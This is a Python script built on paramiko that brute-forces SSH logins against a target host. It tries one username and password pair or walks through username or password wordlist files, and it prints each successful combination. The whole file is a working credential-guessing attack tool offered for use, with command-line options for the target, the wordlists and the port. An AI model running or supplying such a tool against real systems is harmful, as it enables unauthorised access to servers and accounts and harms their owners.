#!/bin/python3
import paramiko, optparse, socket

def ssh_conn(Host, Username, Password, Port):
    conn = paramiko.SSHClient()
    conn.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
    try:
        conn.connect(Host, username=Username, password=Password, port=Port)
        return True
    except paramiko.AuthenticationException:
        return False
    except socket.timeout:
        print("Are you sure there is SSH?")
        exit(0)
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("[-] Unable to connect to port {} on {}".format(Port, Host))
        exit(0)


def main():
    parser = optparse.OptionParser("Usage of program: " + "-t <Target Host> -u <Target Username> -U <Username List> -p <Target Password> -P <Password List> --port <SSH Port>")
    parser.add_option("-t", dest="targetHost", type='string', help="Specify Target Host")
    parser.add_option("-U", dest="usernameFileName", type='string', help="Specify Target Username List")
    parser.add_option("-u", dest="targetUsername", type='string', help="Specify Target Username")
    parser.add_option("-p", dest="targetPassword", type='string', help="Specify Target Password")
    parser.add_option("-P", dest="passwordFileName", type='string', help="Specify Target Passwords List")
    parser.add_option("--port", dest="sshPort",default="22", type='string', help="Specify Target's SSH Port")
    (options, args) = parser.parse_args()
    targetHost = options.targetHost
    targetUsername = options.targetUsername
    usernameFileName = options.usernameFileName
    targetPassword = options.targetPassword
    passwordFileName = options.passwordFileName
    sshPort = options.sshPort

    if targetHost == None or (usernameFileName == None and targetUsername == None) or (targetPassword == None and passwordFileName == None):
        print(parser.usage)
        exit(0)

    if targetPassword != None and targetUsername != None:
        if ssh_conn(targetHost, targetUsername, targetPassword, sshPort):
            print("[+] {} : {}".format(targetUsername, targetPassword))
        else:
            print("[-] {} : {}".format(targetUsername, targetPassword))

    if usernameFileName != None:
        usernames = open(usernameFileName, "r")
        for username in usernames.readlines():
            if ssh_conn(targetHost, username.strip(), targetPassword, sshPort):
                print("[+] {} : {}".format(username.strip(), targetPassword))
                break
            else:
                print("[-] {} : {}".format(username.strip(), targetPassword))


    if passwordFileName != None:
        passwords = open(passwordFileName, "r")
        for password in passwords.readlines():
            if ssh_conn(targetHost, targetUsername, password.strip(), sshPort):
                print("[+] {} : {}".format(targetUsername, password).strip())
                break
            else:
                print("[-] {} : {}".format(targetUsername, password).strip())
main()